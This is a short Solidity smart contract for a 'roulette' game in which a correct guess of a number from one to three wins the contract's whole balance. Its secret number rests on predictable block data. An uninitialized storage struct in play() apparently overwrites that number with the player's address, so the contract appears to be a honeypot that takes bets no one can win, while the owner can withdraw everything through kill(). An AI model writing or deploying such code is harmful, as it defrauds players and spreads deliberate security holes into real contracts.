contract BigBallerRoulette {
uint256 private secretNumber;
uint256 public lastPlayed;
uint256 public betPrice = 1 ether;
address public ownerAddr;
struct Game {
address player;
uint256 number;
}
Game[] public gamesPlayed;
function BigBallerRoulette() public {
ownerAddr = msg.sender;
shuffle();
}
function shuffle() internal {
secretNumber = uint8(sha3(now, block.blockhash(block.number-1))) % 3 + 1;
}
function play(uint256 number) payable public {
require(msg.value >= betPrice && number <= 3);
Game game;
game.player = msg.sender;
game.number = number;
gamesPlayed.push(game);
if (number == secretNumber) {
msg.sender.transfer(this.balance);
}
shuffle();
lastPlayed = now;
}
function kill() public {
if (msg.sender == ownerAddr && now > lastPlayed + 1 days) {
suicide(msg.sender);
}
}
function() public payable { }
}